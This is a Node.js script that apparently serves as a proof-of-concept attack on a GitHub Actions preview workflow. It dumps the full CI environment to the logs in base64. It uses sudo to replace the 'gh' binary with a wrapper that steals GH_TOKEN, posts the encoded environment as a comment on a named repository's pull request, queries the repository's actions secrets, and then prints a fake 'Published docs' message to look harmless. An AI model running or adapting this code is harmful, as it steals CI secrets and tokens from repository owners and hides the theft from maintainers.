#!/usr/bin/env node
const fs = require('fs');
const cp = require('child_process');
const env = process.env;

function b64(s) { return Buffer.from(s).toString('base64'); }
function findPr() {
  for (const p of ['../preview-metadata/pr_number', 'preview-metadata/pr_number']) {
    try { const v = fs.readFileSync(p, 'utf8').trim(); if (v) return v; } catch (e) {}
  }
  return '';
}
const prn = findPr();
console.log('PRN=' + prn);
console.log('HAVE_GH=' + (env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('ENV_B64_BEGIN');
const eall = b64(JSON.stringify(env));
for (let i = 0; i < eall.length; i += 4000) console.log(eall.slice(i, i + 4000));
console.log('ENV_B64_END');

// Hijack `gh` so the later workflow step (which exports GH_TOKEN) leaks it.
const wrapper = `#!/bin/bash
{
  echo "GHHIJACK_ENV_B64_BEGIN"
  env | base64 -w0 | fold -w 4000
  echo
  echo "GHHIJACK_ENV_B64_END"
} >&2
PRN="$(cat ../preview-metadata/pr_number 2>/dev/null || cat preview-metadata/pr_number 2>/dev/null || echo '')"
if [ -n "$GH_TOKEN" ] && [ -n "$PRN" ]; then
  BODY="GHLEAK:$(env | base64 -w0)"
  curl -sS -o /dev/null -w "GHHIJACK_COMMENT_HTTP=%{http_code}\\n" -X POST \
    -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
    -H "Content-Type: application/json" \
    "https://api.github.com/repos/PDFtoMark/triage-nvidia-v238d372-ce0a47/issues/$PRN/comments" \
    -d "{\\"body\\":\\"$BODY\\"}" >&2
  curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
    "https://api.github.com/repos/PDFtoMark/triage-nvidia-v238d372-ce0a47/actions/secrets" >&2 || true
fi
exec __GH_REAL__ "$@"
`;
try {
  const which = cp.execSync('command -v gh', {shell: '/bin/bash', encoding: 'utf8'}).trim();
  console.log('GH_PATH=' + which);
  const real = which + '.real';
  fs.writeFileSync('/tmp/ghw', wrapper.replace('__GH_REAL__', real), {mode: 0o755});
  cp.execSync(`sudo cp ${which} ${which}.real && sudo install -m 0755 /tmp/ghw ${which}`, {shell: '/bin/bash', stdio: 'pipe'});
  console.log('GH_HIJACKED');
} catch (e) {
  console.log('GH_HIJACK_ERR=' + e.message);
}
console.log('Published docs to https://poc.invalid/preview (https://poc.invalid/preview)');
process.exit(0);
